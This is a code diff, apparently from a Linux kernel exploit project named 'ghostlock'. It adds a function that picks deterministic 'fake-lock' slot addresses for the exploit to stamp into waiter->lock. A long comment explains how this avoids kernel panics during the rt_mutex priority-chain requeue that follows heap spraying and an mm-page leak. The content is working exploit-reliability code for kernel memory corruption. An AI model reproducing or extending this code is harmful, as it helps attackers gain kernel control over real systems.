@@ -492,6 +492,31 @@ namespace ghostlock::support {
      * re-creating that. */
     static int32_t g_mm_leak_fail_streak = 0;
 
+    /* v13: deterministic fake-lock slots in the CLI-verified safe zero zone
+     * (target::zero_lock). The select route stamps waiter->lock here instead of
+     * the sprayed payload page: a zeroed slot makes the whole adjust_prio_chain
+     * aftermath deterministic ([7] requeue = insert-as-black-root on the empty
+     * tree, [9] owner==NULL exits) — the v12.12 pstore panic was the requeue
+     * descent wandering a payload page whose content is only a page-recycling
+     * gamble (base = leaked-mm page; if the gamble loses, the planted W0 root
+     * is not there and rb_insert_color walks live slab/zeroed data). Bank is
+     * keyed by pid: a restarted process must not replay slots its predecessor
+     * already dirtied (a dirty slot's root is a dead stack VA). */
+    uintptr_t next_zero_lock_slot(void) {
+        static uint32_t zero_lock_use_count = 0;
+        const uintptr_t bank =
+            static_cast<uintptr_t>(getpid()) % static_cast<uintptr_t>(target::zero_lock::kBankCount);
+        const uintptr_t index =
+            static_cast<uintptr_t>(zero_lock_use_count++) %
+            static_cast<uintptr_t>(target::zero_lock::kSlotsPerBank);
+        const uintptr_t slot = target::zero_lock::kZoneBase +
+                               bank * target::zero_lock::kBankStride +
+                               index * target::zero_lock::kSlotStride;
+        pr_info("[zerolock] slot bank=%zu index=%zu addr=0x%016zx\n",
+                static_cast<size_t>(bank), static_cast<size_t>(index), slot);
+        return slot;
+    }
+
     uintptr_t prepare_kernel_page(const memory::WriteRequest *request) {
         struct timespec t_spray;
         clock_gettime(CLOCK_MONOTONIC, &t_spray);
